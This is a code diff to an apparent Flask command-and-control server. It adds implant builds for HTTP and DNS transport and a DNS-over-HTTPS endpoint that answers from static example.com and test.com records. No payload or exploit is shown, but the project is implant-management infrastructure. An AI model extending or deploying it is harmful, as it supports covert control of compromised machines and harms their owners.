@@ -1,5 +1,6 @@
 import base64
-import os
+from dnslib import QTYPE, DNSRecord, RR, A, PTR, RCODE
+import dnslib
 from urllib.parse import urlparse
 import hashlib
 import hmac
@@ -17,7 +18,7 @@ from queue import Queue, Empty
 from threading import Thread
 import secrets
 
-from flask import Flask, request, jsonify, abort
+from flask import Flask, request, jsonify, abort, Response
 
 import ipv6_encoder
 import pw_hash
@@ -54,6 +55,18 @@ logging.basicConfig(
     format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
     datefmt='%Y-%m-%d %H:%M:%S',
 )
+
+
+DOMAIN_TO_IP = {
+    "example.com.": "192.168.1.100",
+    "test.com.": "192.168.1.101"
+}
+
+IP_TO_HOSTNAME = {
+    "100.1.168.192.in-addr.arpa.": "example.com.",
+    "101.1.168.192.in-addr.arpa.": "test.com."
+}
+
 
 # Load the default config file
 with open('s_conf.json', 'r') as file:
@@ -148,19 +161,38 @@ def build_implant(protocol):
     :param protocol: The protocol to communicate over
     :return: bool depending on build success
     """
-    rand_num = random.randint(1000, 9999)
     logger.info("building implant")
     match protocol:
         case "http":
             try:
                 result = subprocess.run(
-                    ["make Makefile"],
+                    ["make build METHOD=withHttp"],
                     cwd='../Implant',
                     check=True,
                     capture_output=True,
                     text=True
                 )
-                logger.info("success building")
+                logger.info("success building implant for HTTP")
+                print(result)
+                return True
+            except subprocess.CalledProcessError as e:
+                logger.error(f"error building: {e}")
+                logger.error(f"stdout: {e.stdout}")
+                logger.error(f"stderr: {e.stderr}")
+                return False
+            except Exception as e:
+                logger.error(f"general exception occurred: {e}")
+                return False
+        case "dns":
+            try:
+                result = subprocess.run(
+                    ["make build METHOD=withDns"],
+                    cwd='../Implant',
+                    check=True,
+                    capture_output=True,
+                    text=True
+                )
+                logger.info("success building implant for DNS")
                 print(result)
                 return True
             except subprocess.CalledProcessError as e:
@@ -533,6 +565,58 @@ def restrict_routes():
         if find_get_val(request.method):
             logger.warning(f"disabled route accessed: {request.path} {request.method}")
             abort(404)  # Return a 404 if the route is disabled
+
+
+@app.route('/dns-query', methods=['GET', 'POST'])
+def doh_handler():
+    # Decode the incoming DNS query
+    if request.method == 'POST':
+        dns_query = request.data
+    elif request.method == 'GET':
+        dns_query_base64 = request.args.get('dns')
+        dns_query = base64.urlsafe_b64decode(dns_query_base64)
+
+    # Parse the DNS query using dnslib
+    dns_packet = dnslib.DNSRecord.parse(dns_query)
+    header = dns_packet.header
+    transaction_id = header.id  # Transaction ID
+    query = dns_packet.q  # First DNS question (we handle one query per request)
+
+    # Extract query name and type
+    qname = query.qname
+    qtype = QTYPE[query.qtype]
+
+    response_packet = DNSRecord(dns_packet.header)  # Create response packet
+    response_packet.header.id = transaction_id
+    response_packet.header.qr = 1  # Set QR (Query Response)
+    response_packet.header.aa = 1  # Authoritative Answer
+    response_packet.header.ra = 1  # Recursion Available
+
+    if qtype == "PTR":
+        # Handle reverse DNS (PTR) query
+        if str(qname) in IP_TO_HOSTNAME:
+            hostname = IP_TO_HOSTNAME[str(qname)]
+            response_packet.add_answer(
+                RR(rname=qname, rtype=QTYPE.PTR, rclass=1, ttl=300, rdata=PTR(hostname))
+            )
+        else:
+            response_packet.header.rcode = RCODE.NXDOMAIN  # No such domain
+    elif qtype == "A":
+        # Handle standard DNS (A) query
+        if str(qname) in DOMAIN_TO_IP:
+            ip_address = DOMAIN_TO_IP[str(qname)]
+            response_packet.add_answer(
+                RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=300, rdata=A(ip_address))
+            )
+        else:
+            response_packet.header.rcode = RCODE.NXDOMAIN  # No such domain
+    else:
+        # Unsupported query type
+        response_packet.header.rcode = RCODE.NOTIMP  # Not implemented
+
+    # Send the DNS response back
+    response_data = response_packet.pack()
+    return Response(response_data, content_type="application/dns-message")
 
 
 def start_flask():
